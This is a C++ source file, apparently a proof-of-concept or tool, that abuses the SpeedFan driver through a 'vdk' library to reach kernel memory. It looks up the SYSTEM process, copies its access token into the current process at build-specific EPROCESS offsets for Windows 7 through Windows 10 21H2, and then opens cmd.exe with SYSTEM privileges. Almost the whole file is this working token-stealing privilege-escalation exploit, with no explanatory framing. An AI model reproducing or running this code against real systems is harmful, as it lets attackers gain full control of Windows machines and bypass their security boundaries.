#include <vdk/vdk.hpp>

#include "speedfan.hpp"

#include <iostream>

using dbgprint_t   = void(*)(const char*, ...);
using proclookup_t = unsigned long(*)(unsigned long, void**);

/// \brief Mapping between windows version and token offset within eprocess structure.
///
static const std::unordered_map<unsigned, unsigned> eprocess_token_ver =
{
    { 19044, 0x4b8 }, // 21H2
    { 19043, 0x4b8 }, // 21H1
    { 19042, 0x4b8 }, // 20H2
    { 19041, 0x4b8 }, // 20H1
    { 18363, 0x360 }, // 19H2
    { 18362, 0x360 }, // 19H1
    { 17763, 0x358 }, // Redstone 5
    { 17134, 0x358 }, // Redstone 4
    { 16299, 0x358 }, // Redstone 3
    { 15063, 0x358 }, // Redstone 2
    { 14393, 0x358 }, // Redstone 1
    { 10586, 0x358 }, // Threshold 2
    { 10240, 0x358 }, // Threshold 1
    { 7601,  0x208 }, // 2008R2 SP1
    { 7600,  0x208 }, // 2008R2 RTM
};

void run_speedfan(unsigned token_offset)
{
    speedfan::context ctx(std::filesystem::current_path().append("SpeedFan"));

    auto rdmem = [&](uint64_t addr, uint64_t size, uint8_t* data)
    {
        return ctx.rdmem(addr, size, data);
    };
    auto wrmem = [&](uint64_t addr, uint64_t size, uint8_t* data)
    {
        return ctx.wrmem(addr, size, data);
    };

    void* sysproc{};
    vdk::map::syscall<proclookup_t>(rdmem, wrmem, "PsLookupProcessByProcessId", 4, &sysproc);

    std::printf("System eprocess: %p\n", sysproc);

    auto pid = GetCurrentProcessId();

    ctx.exec_phy([pid=pid, token_offset=token_offset](void* base, vdk::resolver_t resolver)
    {
        // Resolve useful functions.
        //
        auto print      = reinterpret_cast<dbgprint_t>(resolver(base, "DbgPrint"));
        auto proclookup = reinterpret_cast<proclookup_t>(resolver(base, "PsLookupProcessByProcessId"));
        void* curproc{};
        void* sysproc{};
        // Get EPROCESS structure of system process and current process.
        //
        if (NT_SUCCESS(proclookup(pid, &curproc)) && NT_SUCCESS(proclookup(4, &sysproc)))
        {
            auto systoken = *reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(sysproc) + token_offset);
            print("System token: 0x%x\n", systoken);
            *reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(curproc) + token_offset) = systoken;
        }
        else
            print("Failed to resolve process structures\n");
    });
}

int main(int argc, char** argv)
{
    RTL_OSVERSIONINFOW version;
    fassert(NT_SUCCESS(RtlGetVersion(&version)));
    std::printf("OS Version: %d.%d %d\n", version.dwMajorVersion, version.dwMinorVersion, version.dwBuildNumber);

    if (auto token = eprocess_token_ver.find(version.dwBuildNumber); token != eprocess_token_ver.end())
    {
        std::printf("_EPROCESS!Token offset: 0x%x\n", token->second);
        run_speedfan(token->second);
        system("cmd.exe");
    }
    else
    {
        std::printf("Could not find eprocess token offset for this version.\n");
    }
    system("pause");
}
